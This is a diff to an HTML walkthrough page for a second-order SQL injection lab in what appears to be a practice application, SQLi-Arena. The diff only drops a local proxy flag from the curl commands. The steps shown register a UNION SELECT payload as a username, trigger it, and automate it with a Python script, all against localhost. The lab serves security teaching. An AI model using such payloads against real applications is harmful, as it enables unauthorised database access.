@@ -13,7 +13,7 @@
         <span class="terminal-title">Step 1. Normal Registration</span>
     </div>
     <div class="terminal-body">
-        <span class="prompt">$ </span>curl -x http://127.0.0.1:8080 -c /tmp/lab18.txt -b /tmp/lab18.txt \<br>
+        <span class="prompt">$ </span>curl -c /tmp/lab18.txt -b /tmp/lab18.txt \<br>
         &nbsp;&nbsp;-X POST "http://localhost/SQLi-Arena/mysql/lab18" -d "action=register" \<br>
         &nbsp;&nbsp;--data-urlencode "reg_username=testuser" --data-urlencode "reg_password=test123"<br><br>
         <span class="prompt">Register: </span>username=testuser, password=test123<br><br>
@@ -69,7 +69,7 @@
         <span class="terminal-title">Step 3. Malicious Registration</span>
     </div>
     <div class="terminal-body">
-        <span class="prompt">$ </span>curl -x http://127.0.0.1:8080 -c /tmp/lab18.txt -b /tmp/lab18.txt \<br>
+        <span class="prompt">$ </span>curl -c /tmp/lab18.txt -b /tmp/lab18.txt \<br>
         &nbsp;&nbsp;-X POST "http://localhost/SQLi-Arena/mysql/lab18" -d "action=register" \<br>
         &nbsp;&nbsp;--data-urlencode "reg_username=' UNION SELECT flag_text, 2, 3 FROM secrets -- -" \<br>
         &nbsp;&nbsp;--data-urlencode "reg_password=anything"<br><br>
@@ -96,7 +96,7 @@
         <span class="terminal-title">Step 4. Second-Order Trigger</span>
     </div>
     <div class="terminal-body">
-        <span class="prompt">$ </span>curl -x http://127.0.0.1:8080 -c /tmp/lab18.txt -b /tmp/lab18.txt \<br>
+        <span class="prompt">$ </span>curl -c /tmp/lab18.txt -b /tmp/lab18.txt \<br>
         &nbsp;&nbsp;"http://localhost/SQLi-Arena/mysql/lab18"<br><br>
         <span class="prompt">Query 1 (safe): </span>SELECT id, username, password, bio FROM users WHERE id = 26<br>
         <span class="prompt">Stored username: </span>' UNION SELECT flag_text, 2, 3 FROM secrets -- -x1774337821<br><br>
@@ -152,7 +152,7 @@
         <span class="terminal-title">Step 7. Python Automation (lab18_second_order.py)</span>
     </div>
     <div class="terminal-body">
-        <span class="prompt">$ </span>python3 scripts/lab18_second_order.py http://localhost/SQLi-Arena/<br><br>
+        <span class="prompt">$ </span>python3 scripts/lab18_second_order.py http://localhost/SQLi-Arena<br><br>
         <span class="prompt">[*] </span>Step 1: Logging out any existing session...<br>
         <span class="prompt">[*] </span>Step 2: Registering with payload username...<br>
         <span class="prompt">&nbsp;&nbsp;</span>Username: ' UNION SELECT flag_text, 2, 3 FROM secrets -- -<br>
